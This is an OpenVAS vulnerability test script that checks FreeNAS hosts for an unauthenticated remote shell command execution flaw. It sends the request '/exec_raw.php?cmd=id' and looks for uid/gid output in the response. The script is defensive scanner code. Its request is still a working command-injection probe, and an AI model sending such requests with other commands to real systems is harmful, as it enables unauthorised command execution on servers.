###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freenas_44974.nasl 8431 2018-01-16 05:33:47Z ckuersteiner $
#
# FreeNAS Remote Shell Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:freenas:freenas";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100912");
 script_version("$Revision: 8431 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-16 06:33:47 +0100 (Tue, 16 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-11-19 13:40:50 +0100 (Fri, 19 Nov 2010)");
 script_bugtraq_id(44974);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_name("FreeNAS Remote Shell Command Execution Vulnerability");

 script_xref(name: "URL", value: "https://www.securityfocus.com/bid/44974");
 script_xref(name: "URL", value: "http://sourceforge.net/projects/freenas/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_freenas_detect.nasl");
 script_mandatory_keys("freenas/detected");

 script_tag(name: "summary", value: "FreeNAS is prone to a shell-command-execution vulnerability because the
application fails to properly sanitize user-supplied input.

An attacker can exploit the remote shell-command-execution issue to execute arbitrary shell commands in the
context of the webserver process.

FreeNAS versions prior to 0.7.2 rev.5543 are vulnerable.");

 exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
   
if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/exec_raw.php?cmd=id"; 

if (http_vuln_check(port: port,url: url, pattern: "uid=[0-9]+.*gid=[0-9]+.*")) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
